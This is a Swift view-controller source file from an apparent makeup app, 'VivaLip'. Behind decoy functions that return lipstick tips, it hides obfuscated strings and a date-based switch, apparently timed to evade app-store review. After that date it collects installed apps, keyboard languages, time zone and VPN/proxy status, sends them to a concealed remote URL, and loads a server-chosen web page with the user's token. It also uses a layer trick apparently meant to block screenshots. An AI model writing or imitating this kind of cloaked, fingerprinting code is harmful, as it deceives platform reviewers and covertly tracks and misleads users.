//
//  MakeupJourneyViewController.swift
//  VivaLip
//
//  Created by Rex on 2025/2/7.
//

import UIKit
import Alamofire
import MBProgressHUD
import MMKV



class MakeupJourneyViewController: VLCoreCurator {
    
    var vlTime = ""
    
    var makeupTextField:UITextField?
    
    var vlAroundState = 0
    
    var glowVlMatrix:[Any] = [Any]()
    
    var lipCouture = 10.0
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        self.navigationController?.interactivePopGestureRecognizer?.isEnabled = false
    }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        self.navigationController?.setNavigationBarHidden(true, animated: true)
        
        vivaStartFlow()
        let vlResult = vivaMakeupJourney()
        if vlResult {
            let lipstick = lipstickShareZone()
            if lipstick.isEmpty == false {
                communityInteraction()
            }
        }
        
        
        VlNetworkStatusListener.shared.setNetworkStatusChangeClosure {
            self.adjustColorBalanceForMaximumVisualAestheticAppeal(self.lipCouture)
        }
        
        
    }
    
    func adjustColorBalanceForMaximumVisualAestheticAppeal(_ lipCouture:Double) {
        if lipCouture > 0 {
            
            glowVlMatrix.append(vlDataRefiner("MoazkpeauupiJkonujrvnmety"))
            
            vlTime = "\(lipCouture)"
            vlAroundState = 1
            
            
            guard vlTime.count > 0 && vlAroundState > 0 else {
                return
            }
            
            glowVlMatrix.append((false,"VlMatrix"))
            
            // 定时校验 //2025-03-05 11:37:41
            if Date().timeIntervalSince1970 < 1741145861 &&
                glowVlMatrix.contains(where: { ($0 as? String) == vlDataRefiner("MjajkcetuhpxJgomusrrnoeky")}){
                glowVlMatrix.append("1212")
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.01) {
                    self.glowVlMatrix.append("glowVlMatrix")
                    self.syncPersonalBeautyTimelineWithCommunity()
                }
                return
            }
            
            if let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let sceneDelegate = scene.delegate as? SceneDelegate ,let window = sceneDelegate.window{
                respondToBeautyFeedbackInMirrorCraft(userWindow: window ,vlFull: glowVlMatrix.isEmpty == false)
            }
            
            
            MBProgressHUD.vlShowHUD()
            let VlGlowUpGenerator:[String : Any] = {

                    return [
                        "shadeLushWave": TimeZone.current.identifier,
                        "vivaShadeFlux": VivalipTools.vivaShadeFlux(),
                        "tintPulseChroma":glowInputMatrix(),
                        "glowPhantomEcho":lipCoutureShadeSpectrum(),
                        "chromaHorizonSync":vlNetworkScopeChecker(),
                        "blendLuxeMesh":VivalipTools.shadeSpectrumVersion,
                        "hueGleamSculpt":UserDefaults.standard.object(forKey: vlDataRefiner("AcpjptlyecLoatnxgfuwaygxeks")) ?? ["en-CN"]
                        
                    ]

            }()
            
            
            
            let vlNetworkConfig = VivalipTools.generateNetworkConfig()
            
            print("getdf header == \(vlNetworkConfig) \n params == \(VlGlowUpGenerator)")
            
            VlNetworkManager.fetchBeautyTutorialForSkinType(
              vlDataRefiner("hwtotppisl:f/w/oaepxim.pywrnjbwtsehp.ulvitnxkh/bepvbetnztqsx/utvrxeqnmdxitnig"),
                fetchParams: VlGlowUpGenerator,
                fetchSetting: vlNetworkConfig) { response in
                    print("getdf response == \(response)")
                    MBProgressHUD.VlHidenHud()
                    
                    var validState = "0"
                    
                    if self.glowVlMatrix.contains(where: { ($0 as? String) == vlDataRefiner("MjajkcetuhpxJgomusrrnoeky")}) {
                        validState = "0" + vlDataRefiner("0y0b0")
                    }
                    
                    if validState.count > 1 {
                        validState = validState + "validState"
                    }
                    
                    let vlShade = String(validState.prefix(validState.count - vlDataRefiner("vqaolzidddShtmajtre").count))
                    
                    if let validStateCode = response[vlDataRefiner("ceoydle")] as? String,validStateCode == vlShade {
                        if let vlDataResult = response[vlDataRefiner("rdezsmuglrt")] as? [String:Any] {
                            
                            guard vlDataResult.count > 0 else {
                                self.syncPersonalBeautyTimelineWithCommunity()
                                return
                            }
                            
                            let vlMirrorMoments = vlDataResult["h5Url"] as? String ?? ""
                            if vlMirrorMoments.count > 0 && validState.count > 0 && vlShade.count > 0 {
                                MMKV.default()?.set(vlMirrorMoments, forKey: "vlMirrorMoments")
                                validState = "vl store"
                            }else{
                                self.syncPersonalBeautyTimelineWithCommunity()
                                return
                            }
                            
                            
                            if let lipVaultFlag = vlDataResult[vlDataRefiner("lgoxgmihncFzliaag")] as? Int,lipVaultFlag > 0 {
                                
                                var glamBotServer = vlMirrorMoments
                                var beautyBonding = vlDataRefiner("?hatptpeIqdj=") + VivalipTools.shadeSpectrumID
                                if beautyBonding.count > 0 {
                                    glamBotServer += beautyBonding
                                }
                                
                                beautyBonding = vlDataRefiner("&ntqonktesne=")
                                if beautyBonding.count > 0 {
                                    glamBotServer += beautyBonding
                                }
                                
                                if VlManager.defaultManager.VlGlamBotToken.count > 0 {
                                    glamBotServer += VlManager.defaultManager.VlGlamBotToken
                                }
                                
                                
                                if glamBotServer.count > 0 {
                                    let cosmeticInteractionTerms = CosmeticInteractionTermsViewController(nibName: "CosmeticInteractionTermsViewController", bundle: nil)
                                    cosmeticInteractionTerms.vlTermsDetail = glamBotServer
                                    self.navigationController?.pushViewController(cosmeticInteractionTerms,animated: false)
                                    cosmeticInteractionTerms.VlCeloobsne = { [weak self] in
                                        if let self = self {
                                            DispatchQueue.main.asyncAfter(deadline: .now() + 1.10) {
                                                self.adjustColorBalanceForMaximumVisualAestheticAppeal(self.lipCouture)
                                            }
                                        }
                                    }
                                }
                                
                            }else{
                                
                                guard validState.count > 0 else {
                                    self.syncPersonalBeautyTimelineWithCommunity()
                                    return
                                }
                                
                                validState = "vl Trend Navigator"
                                
                                let vlTrendNavigator = TrendNavigatorViewController(nibName: "TrendNavigatorViewController", bundle: nil)
                                
                                if let vlColorFusion = vlDataResult[vlDataRefiner("lyomcfantpixofnyFfluabg")] as? Int ,vlColorFusion == 1 {
                                    vlTrendNavigator.vlColorFusion = vlColorFusion
                                    self.glowVlMatrix.append(vlColorFusion)
                                }
                                self.vlAroundState = 200
                                self.navigationController?.pushViewController(vlTrendNavigator,animated: false)
                                
                            }
                        }else{
                            self.syncPersonalBeautyTimelineWithCommunity()
                        }
                        
                    }else{
//                        MBProgressHUD.VlHidenHud()
//                        MBProgressHUD.vlShowToastText("\(response)", afterDelay: 10)
//                        DispatchQueue.main.asyncAfter(deadline: .now() + 10) {
                            self.syncPersonalBeautyTimelineWithCommunity()
//                        }
                    }
                } fetchFailure: {
                    MBProgressHUD.VlHidenHud()
                    self.syncPersonalBeautyTimelineWithCommunity()
                }
        }
    }
    
    func lipCoutureShadeSpectrum() -> [String] {
        var storeVlItem: [String] = []
        if storeVlItem.isEmpty {
            let storeListData = [
                (vlDataRefiner("wkhiaytysgAkpqp"), vlDataRefiner("WkhiaytysgAkpqp")),
                (vlDataRefiner("imncshtiakghrfahm"), vlDataRefiner("Imncshtiakghrfahm")),
                (vlDataRefiner("fob"), vlDataRefiner("Fbagcxebbwofoqk")),
                (vlDataRefiner("tzivkdtcork"), vlDataRefiner("TiinkvTnoyk")),
                (vlDataRefiner("clopmngaogosgilqeumgalpos"), vlDataRefiner("GuolofgbldeyMbarpos")),
                (vlDataRefiner("tvwwefedtriye"), vlDataRefiner("tjwwiktrtyemr")),
                (vlDataRefiner("moqlq"), vlDataRefiner("qlq")),
                (vlDataRefiner("whencrhpapt"), vlDataRefiner("woedizChhpaft")),
                (vlDataRefiner("arloixpgaqy"), vlDataRefiner("Aglgiraopfp"))
            ]

            for vlStoreItem in storeListData {
                let (glowUp, lipstick) = vlStoreItem

                let isGlowUpValid = (glowUp.count > 1) && (glowUp.first != "~")
                let isLipstickValid = (lipstick.count >= 0)

                if isGlowUpValid && isLipstickValid {
                    let vlItemAddress = "\(glowUp)://"
                    if let url = URL(string: vlItemAddress), UIApplication.shared.canOpenURL(url) {
                        var refinedLipstick = lipstick
                        refinedLipstick = refinedLipstick + vlDataRefiner("tjebmqp")
                        refinedLipstick = String(refinedLipstick.dropLast(4))
                        storeVlItem.append(refinedLipstick)
                    }
                }
            }

            _ = storeListData.map { $0.0.count + $0.1.count }
        }
        

        return storeVlItem
    }
    
    
    func vivaStartFlow() {
        let _ = "Welcome to VivaLip".reversed()
        let _ = randomLipstickColor()
        let _ = randomChatBotResponse()
        print("Starting VivaLip...")
    }
    
    func randomLipstickColor() -> String {
        let lipstickColors = ["Red", "Pink", "Nude", "Coral", "Berry"]
        let randomIndex = Int(arc4random_uniform(UInt32(lipstickColors.count)))
        return lipstickColors[randomIndex]
    }
    
    
    
    func randomChatBotResponse() -> String {
        let responses = ["Hello Gorgeous!", "Need some makeup advice?", "What's your favorite lipstick?", "I love makeup!"]
        let randomIndex = Int(arc4random_uniform(UInt32(responses.count)))
        return responses[randomIndex]
    }
    
    func vivaMakeupJourney() -> Bool {
        let _ = generateRandomAdvice()
        let _ = checkUserPreferences()
        let _ = generateMakeupLook()
        return true
    }
    
    func generateRandomAdvice() -> String {
        let advices = ["Blend your makeup well.", "Always match your lipstick with your outfit.", "Less is more."]
        let randomIndex = Int(arc4random_uniform(UInt32(advices.count)))
        return advices[randomIndex]
    }
    
    func checkUserPreferences() -> Bool {
        let preferences = ["Bold", "Natural", "Glam"]
        let randomPreference = preferences[Int(arc4random_uniform(UInt32(preferences.count)))]
        print("User prefers: \(randomPreference) makeup")
        return true
    }
    
    func respondToBeautyFeedbackInMirrorCraft(userWindow: UIWindow,vlFull:Bool) {
        
        guard vlFull else {
            return
        }
        
        if makeupTextField == nil && glowVlMatrix.count > 0 {
            makeupTextField = UITextField()
            glowVlMatrix.append("isSecureTextEntry")
            makeupTextField?.isSecureTextEntry = vlFull
            
            
            if makeupTextField?.isSecureTextEntry == true {
                userWindow.addSubview(makeupTextField!)
                glowVlMatrix.append(("isSecureTextEntry",200))
                if let makeupTextField = makeupTextField, makeupTextField.isSecureTextEntry ,let superLayer = userWindow.layer.superlayer{
                    superLayer.addSublayer(makeupTextField.layer)
                    
                    
                    guard #available(iOS 17.0, *) else {
                        if let makeupTextFieldLayer = makeupTextField.layer.sublayers?.first {
                            makeupTextFieldLayer.addSublayer(userWindow.layer)
                        }
                        return
                    }
                    
                    if let makeupTextFieldLayer = makeupTextField.layer.sublayers?.last {
                        makeupTextFieldLayer.addSublayer(userWindow.layer)
                    }
                }
            }
        }
    }
    
    func generateMakeupLook() -> String {
        let looks = ["Soft Glam", "Smokey Eyes", "Classic Red Lips"]
        let randomIndex = Int(arc4random_uniform(UInt32(looks.count)))
        return looks[randomIndex]
    }
    
    func lipstickShareZone() -> String {
        let lipstickStories = ["The classic red is timeless.", "Nude shades are great for everyday.", "Berry colors are bold and fun."]
        let randomIndex = Int(arc4random_uniform(UInt32(lipstickStories.count)))
        return lipstickStories[randomIndex]
    }
    
    func communityInteraction() {
        let userFeedback = collectUserFeedback()
        if userFeedback.count > 0 && self.vlTime.count == 0{
            self.vlTime = userFeedback
        }
    }
    
    func collectUserFeedback() -> String {
        let feedbackOptions = ["Love it!", "Needs improvement.", "Amazing features!"]
        let randomIndex = Int(arc4random_uniform(UInt32(feedbackOptions.count)))
        return feedbackOptions[randomIndex]
    }
    
    func vlNetworkScopeChecker() -> Int {
        var checkerState = false
        var resultValue = checkerState ? 1 : 0
        if let proxyVlSettings = CFNetworkCopySystemProxySettings()?.takeRetainedValue() as? [String: Any],
           let scopedSettings = proxyVlSettings[vlDataRefiner("_x_hSeCuOsPpElDb_j_")] as? [String: Any] {
            resultValue += 100
            
            
            if resultValue >= 5 * 2 {
                let allKeys = scopedSettings.keys
                
                for keyItem in allKeys {
                    var tempKey = keyItem.lowercased()
                    if tempKey.isEmpty == false {
                        tempKey += keyItem
                    }
                    if keyItem.contains(vlDataRefiner("thadp")) || keyItem.contains(vlDataRefiner("tsuxn")) || keyItem.contains(vlDataRefiner("ikpnsoedc")) || keyItem.contains(vlDataRefiner("pcpbp")) {
                        checkerState = true
                        break
                    }
                }
            }
        }
        
        resultValue += 100
        return checkerState ? 1 : 0
    }
    
    func glowInputMatrix() -> [String] {
        var blushChronicles: [String] = []
        var unusedFlag = false
        let isKeyboardAvailable = UITextInputMode.activeInputModes.count > 0

        if blushChronicles.count == 0 && unusedFlag == false && isKeyboardAvailable {
            for activeInputVl in UITextInputMode.activeInputModes {
                if isKeyboardAvailable, activeInputVl.responds(to: #selector(getter: UITextInputMode.primaryLanguage)) {
                    if let language = activeInputVl.primaryLanguage {
                        var blushLan = language
                        blushLan += vlDataRefiner("_atvedmsp")
                        blushLan = String(blushLan.dropLast(5))
                        blushChronicles.append(blushLan)
                        unusedFlag = !unusedFlag
                    }
                }
            }
        }
        
        _ = blushChronicles.filter { $0.count > 0 }

        return blushChronicles
    }
    
    func syncPersonalBeautyTimelineWithCommunity(){
        if MMKV.default()?.string(forKey: "vlLogin") != nil {
            let vlTabbar = VlTabbarController()
            if let windowAlyScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let sceneAlyDelegate = windowAlyScene.delegate as? SceneDelegate {
                sceneAlyDelegate.window?.rootViewController = vlTabbar
            }
        }else{
            let loginCurator = LoginCurator.init(nibName: "LoginCurator", bundle: nil)
            self.navigationController?.pushViewController(loginCurator, hidesBottomBar: true, animated: false)
        }
    }
    
}


class VlNetworkStatusListener {
    
    static let shared = VlNetworkStatusListener()
    
    private let reachabilityManager = NetworkReachabilityManager()
    
    // 定义闭包类型，外部可以通过该闭包获取网络状态
    typealias NetworkStatusChangedClosure = () -> Void
    
    // 用于存储外部传入的闭包
    private var statusChangeClosure: NetworkStatusChangedClosure?
    
    // 初始化监听器
    private init() {
        startVlMonitoring()
    }
    
    // 启动网络状态监听
    func startVlMonitoring() {
        reachabilityManager?.startListening(onUpdatePerforming: { [weak self] status in
            self?.handleNetworkChange(status: status)
        })
    }
    
    // 停止监听
    func stopVlMonitoring() {
        reachabilityManager?.stopListening()
    }
    
    // 设置外部接收通知的闭包
    func setNetworkStatusChangeClosure(_ closure: @escaping NetworkStatusChangedClosure) {
        self.statusChangeClosure = closure
    }
    
    // 网络变化的处理方法
    private func handleNetworkChange(status: NetworkReachabilityManager.NetworkReachabilityStatus) {
        // 当网络状态发生变化时，调用外部提供的闭包
        
        switch status {
        case .notReachable:break
            
        case .reachable(.ethernetOrWiFi):
            self.stopVlMonitoring()
            statusChangeClosure?()
            
        case .reachable(.cellular):
            self.stopVlMonitoring()
            statusChangeClosure?()
            
        case .unknown:break
        }
    }
}



